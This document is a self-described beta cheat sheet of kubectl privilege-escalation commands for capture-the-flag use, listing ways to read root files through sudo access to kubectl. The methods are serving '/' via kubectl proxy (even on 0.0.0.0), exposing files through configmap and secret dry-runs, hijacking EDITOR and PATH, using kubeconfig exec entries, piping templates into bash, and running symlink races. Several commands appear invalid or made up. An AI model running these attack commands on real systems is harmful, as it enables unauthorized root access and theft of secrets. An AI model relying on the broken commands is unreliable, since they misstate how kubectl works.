# kubectl Privilege Escalation Cheat Sheet .. (not-great-beta-edition) ..

## File Serving Vectors
```bash
# Basic file server
sudo kubectl proxy --address=0.0.0.0 --port=PORT --www=PATH --www-prefix=/x/

# Bypass filters
sudo kubectl proxy --www=PATH --www-prefix=/x/ --disable-filter=true

# Serve filesystem root
sudo kubectl proxy --www=/ --www-prefix=/x/

# Access via: wget -qO- http://localhost:PORT/x/target/file
```

## File Reading Techniques
```bash
# ConfigMap creation (dry-run)
sudo kubectl create configmap test --from-file=TARGET --dry-run=client -o yaml

# Secret creation 
sudo kubectl create secret generic test --from-file=TARGET --dry-run=client -o yaml

# Apply with validation
sudo kubectl apply --validate=false --dry-run=client -f TARGET

# File conversion attempts
sudo kubectl convert -f TARGET
```

## Symlink Bypasses
```bash
# Create accessible symlinks
ln -sf /target/file /writable/location
# Access via proxy serving parent directory

# Directory symlinks
ln -sf /target/directory /accessible/path
```

## Environment Variable Abuse
```bash
# Editor hijacking
export EDITOR="command_here; original_editor"
sudo kubectl edit resource

export VISUAL="payload; editor"

# Path manipulation for plugins
echo '#!/bin/sh\npayload' > /tmp/kubectl-custom
chmod +x /tmp/kubectl-custom
PATH=/tmp:$PATH sudo kubectl custom
```

## Configuration Exploitation
```bash
# Malicious kubeconfig with exec
cat > config.yaml << 'EOF'
apiVersion: v1
kind: Config
users:
- name: user
  user:
    exec:
      command: /target/command
      args: ["arg1"]
      apiVersion: client.authentication.k8s.io/v1beta1
EOF

sudo kubectl --kubeconfig=config.yaml command
```

## Output Format Abuse
```bash
# Custom column files
sudo kubectl get -o custom-columns-file=TARGET pods

# Raw output attempts
sudo kubectl get --raw TARGET

# Template processing
sudo kubectl get -o go-template-file=TARGET resource
```

## File Discovery
```bash
# System enumeration
df  # May reveal restricted paths
find /writable -type l  # Find existing symlinks
ls -la /accessible/  # Directory traversal

# Proxy directory listing
wget -qO- http://localhost:PORT/prefix/path/
```

## Completion System
```bash
# Generate completion scripts
sudo kubectl completion bash > /tmp/comp
# May contain file references or can be modified

# Plugin enumeration  
sudo kubectl plugin list
```

## Error-Based Information Disclosure
```bash
# Invalid YAML parsing
echo 'apiVersion: /target/file' > invalid.yaml
sudo kubectl apply -f invalid.yaml

# Validation errors
sudo kubectl create --validate=true -f TARGET
```

## Network Bypass (if applicable)
```bash
# Local-only serving
sudo kubectl proxy --address=127.0.0.1 --port=PORT

# IPv6 binding
sudo kubectl proxy --address=::1 --port=PORT
```

## Common CTF File Locations
```
/flag*
/root/flag*
/home/user/flag*
/tmp/flag*
/var/tmp/flag*
/.flag*
/etc/flag*
```

## Debugging & Troubleshooting
```bash
# Version information
sudo kubectl version --client

# Configuration viewing
sudo kubectl config view

# Help system exploration
sudo kubectl COMMAND --help

# Process monitoring
ps aux | grep kubectl
netstat -tlpn | grep kubectl
```

# More Hacky, Terrible Stuff
# Advanced kubectl Privilege Escalation Techniques, lmao

## Process Substitution & File Descriptors
```bash
# Process substitution with kubectl
sudo kubectl apply -f <(cat /target/file)

# File descriptor manipulation
exec 3< /target/file
sudo kubectl create -f /proc/self/fd/3

# Named pipes
mkfifo /tmp/pipe
cat /target/file > /tmp/pipe &
sudo kubectl apply -f /tmp/pipe
```

## kubectl Internal Mechanisms
```bash
# Cache manipulation
sudo kubectl --cache-dir=/target/dir command

# kubeconfig processing chain
sudo kubectl --kubeconfig=<(echo "apiVersion: v1"; cat /target/file) version

# Token file processing
sudo kubectl --token-file=/target/file version

# Certificate file abuse
sudo kubectl --client-certificate=/target/file version
```

## Resource Generator Abuse
```bash
# Built-in generators with file input
sudo kubectl create job test --image=x --dry-run=client --from-file=/target/file

# Deployment with configMap references
sudo kubectl create deployment test --image=x --dry-run=client -o yaml | sed 's/x/$(cat \/target\/file)/'

# Service account token mounting
sudo kubectl create sa test --dry-run=client -o yaml --token=/target/file
```

## Manifest Processing Beyond YAML
```bash
# JSON processing
echo '{"apiVersion":"v1","data":' > /tmp/pre
cat /target/file >> /tmp/pre
echo '}' >> /tmp/pre
sudo kubectl apply -f /tmp/pre --dry-run=client

# Multi-document processing
echo '---' > /tmp/multi
cat /target/file >> /tmp/multi
echo '---' >> /tmp/multi
sudo kubectl apply -f /tmp/multi --dry-run=client

# kubectl with stdin redirection
cat /target/file | sudo kubectl apply -f -
```

## Output Redirection & Templating
```bash
# Template injection
sudo kubectl create cm test --from-literal=data='{{.}}' --dry-run=client -o go-template='{{.data}}' | bash

# Output to sensitive locations
sudo kubectl version > /target/writable/location
sudo kubectl config view > /proc/self/fd/1

# Error output redirection
sudo kubectl apply -f /target/file 2>&1 | grep -o 'error.*'
```

## Signal & Process Manipulation
```bash
# Background process file reading
sudo kubectl proxy --www=/target/dir &
PID=$!
# Process substitution with background proxy

# Signal handling during file operations
sudo kubectl apply -f /target/file &
kill -STOP $!  # Might leave file handles open
```

## Advanced Configuration Abuse
```bash
# Nested configuration loading
echo "include: /target/file" > /tmp/config
sudo kubectl --kubeconfig=/tmp/config version

# Environment variable file loading
export KUBECONFIG=/target/file
sudo -E kubectl version

# XDG directory manipulation
export XDG_CONFIG_HOME=/target/dir
sudo -E kubectl version
```

## Plugin Architecture Exploitation
```bash
# Dynamic plugin discovery
mkdir -p /tmp/kubectl-plugins
echo '#!/bin/sh\ncat /target/file' > /tmp/kubectl-plugins/kubectl-read
chmod +x /tmp/kubectl-plugins/kubectl-read
PATH=/tmp/kubectl-plugins:$PATH sudo kubectl read

# Plugin manifest processing
echo 'name: evil\ncommand: cat /target/file' > /tmp/plugin.yaml
sudo kubectl plugin install /tmp/plugin.yaml
```

## Resource Patching & Manipulation
```bash
# Strategic merge patch with file content
echo '{"data":{"file":"' > /tmp/patch
base64 /target/file >> /tmp/patch
echo '"}}' >> /tmp/patch
sudo kubectl patch cm test --patch-file=/tmp/patch --dry-run=client

# JSON patch operations
sudo kubectl patch cm test --type='json' -p="[{\"op\":\"add\",\"path\":\"/data/file\",\"value\":\"$(cat /target/file)\"}]" --dry-run=client
```

## Debugging & Development Features
```bash
# kubectl debug features
sudo kubectl debug --share-processes=true --image=busybox node/target

# kubectl alpha commands
sudo kubectl alpha debug --stdin --tty /target/file

# kubectl explain with file references
sudo kubectl explain --include-extended-apis=true $(cat /target/file)
```

## Alternative Binary Invocation
```bash
# kubectl as different names
ln -s $(which kubectl) /tmp/k
sudo /tmp/k proxy --www=/target/dir

# kubectl via exec
sudo exec kubectl proxy --www=/target/dir

# kubectl with modified argv[0]
sudo -u root sh -c 'exec -a modified_kubectl kubectl proxy --www=/target/dir'
```

## File System Race Conditions
```bash
# Atomic file operations
while true; do ln -sf /target/file /tmp/race 2>/dev/null && break; done &
sudo kubectl apply -f /tmp/race &

# Time-of-check-time-of-use
sudo kubectl apply -f /tmp/symlink &
ln -sf /target/file /tmp/symlink
```

## Memory & Cache Exploitation
```bash
# kubectl client-side caching
sudo kubectl --cache-dir=/tmp/evil get pods  # May cache sensitive data

# kubectl diff with cached state
sudo kubectl diff -f <(cat /target/file; echo "---"; kubectl get cm test -o yaml)

# kubectl server-dry-run (client processes file first)
sudo kubectl apply --server-dry-run -f /target/file
```

## Advanced Proxy Configurations
```bash
# Multiple proxy instances with different roots
sudo kubectl proxy --www=/target1 --www-prefix=/a/ --port=8001 &
sudo kubectl proxy --www=/target2 --www-prefix=/b/ --port=8002 &

# Proxy with API and static serving combined
sudo kubectl proxy --www=/target/dir --api-prefix=/api/ --www-prefix=/static/

# Unix domain socket proxying
sudo kubectl proxy --unix-socket=/tmp/kubectl.sock --www=/target/dir
```

## Edge Case Exploitations
```bash
# kubectl with corrupted config
echo "corrupted" > /tmp/bad
export KUBECONFIG=/tmp/bad:/target/file
sudo -E kubectl version

# kubectl with circular references
ln -s /target/file /tmp/a
ln -s /tmp/a /tmp/b
sudo kubectl apply -f /tmp/b

# kubectl with device files
sudo kubectl apply -f /dev/stdin < /target/file
```

*"Sometimes the most creative solutions hide in the intersection of legitimate features."*

Lol.

